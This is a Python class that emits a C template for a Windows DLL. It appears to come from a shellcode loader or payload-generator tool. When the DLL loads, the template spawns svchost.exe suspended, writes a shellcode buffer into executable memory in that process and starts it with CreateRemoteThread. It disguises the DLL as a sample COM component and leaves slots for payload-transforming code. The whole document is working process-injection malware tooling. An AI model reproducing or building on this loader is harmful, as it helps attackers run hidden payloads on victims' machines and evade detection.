class rundll:

    def imports(self) -> list[str]:
        return ["#include <windows.h>", 
                "#include <stdio.h>",
                "#include <stdlib.h>", 
                "#include <winternl.h>",
                "#include <tchar.h>"]

    def compilerOptions(self) -> list[str]:
        return ['-luser32',
                '-shared']

    def template(self) -> str:
        return """
{imports}

// Use __declspec(dllexport) and WINAPI (stdcall) for the export
#ifdef __cplusplus
extern "C" {{
#endif

const TCHAR* g_szCLSID = _T("{{ 5a869dc1-0f8c-4f37-8ade-0ff0d57f758b }}");
const TCHAR* g_szProgID = _T("MyComObject.Sample.1");
const TCHAR* g_szDescription = _T("My Sample COM Component");

{codeblocks}

int executecode(){{
    
    {transformers}

    STARTUPINFOA si = {{
        sizeof(si)
    }}; 
    PROCESS_INFORMATION pi; 

    PPEB pPeb;
    PVOID pImage, pEntry;
    PIMAGE_NT_HEADERS pNtHeaders;
    LONG e_lfanew;
    SIZE_T NumberOfBytesRead;
    DWORD AddressOfEntryPoint;

    CreateProcessA(NULL, (LPSTR) "C:\\\\windows\\\\system32\\\\svchost.exe", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);

    LPVOID pRemoteCode = NULL;
    HANDLE hThread = NULL;

    pRemoteCode = VirtualAllocEx(pi.hProcess, NULL, {shellcodeSize}, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ);
    WriteProcessMemory(pi.hProcess, pRemoteCode, (PVOID)shellcode, (SIZE_T){shellcodeSize}, (SIZE_T *)NULL);
    
    hThread = CreateRemoteThread(pi.hProcess, NULL, 0, pRemoteCode, NULL, 0, NULL);
    WaitForSingleObject(hThread, 500);
    CloseHandle(hThread);
}}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {{
    if (fdwReason == DLL_PROCESS_ATTACH) {{
        executecode();
    }}
    return TRUE;
}}

__attribute__((dllexport)) void CALLBACK Dummy(HWND hwnd, HINSTANCE h, LPSTR c, int n) {{}}

#ifdef __cplusplus
}}
#endif
"""